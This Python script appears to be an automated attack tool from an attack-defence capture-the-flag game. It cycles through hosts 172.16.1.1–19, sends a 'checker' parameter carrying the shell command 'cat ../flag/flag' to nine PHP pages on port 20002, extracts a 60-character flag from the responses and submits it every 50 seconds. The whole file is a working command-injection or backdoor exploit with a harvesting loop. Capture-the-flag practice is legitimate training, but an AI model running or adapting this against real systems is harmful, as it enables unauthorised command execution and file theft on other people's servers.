import requests
import submit
import re
from time import sleep
from multiprocessing import  Pool

ip_prefix = "172.16.1."
mat = re.compile(".*([0-9a-zA-Z]{60}).*")
exploit_point = [
    "http://%s:20002/",
    "http://%s:20002/about.php",
    "http://%s:20002/contact.php",
    "http://%s:20002/download.php",
    "http://%s:20002/info.php",
    "http://%s:20002/news.php",
    "http://%s:20002/product.php",
    "http://%s:20002/search.php",
    "http://%s:20002/view.php"
]

def crack_checker(ip):
    for exp in exploit_point:
        r = requests.get(exp % (ip), params={"checker": "cat ../flag/flag"})
        a = mat.findall(r.content)
        if len(a) > 0 :
            return a[0]
    return None

l  = []

def do_checker(ip):
    ans = crack_checker(ip_prefix + ip)
    if ans:
        submit.submit(ans)

for i in range(1, 20):
    l.append(str(i))

while True:
    pool = Pool(1)
    pool.map(do_checker, l)
    pool.close()
    pool.join()
    #map(do_checker, l)
    sleep(50)


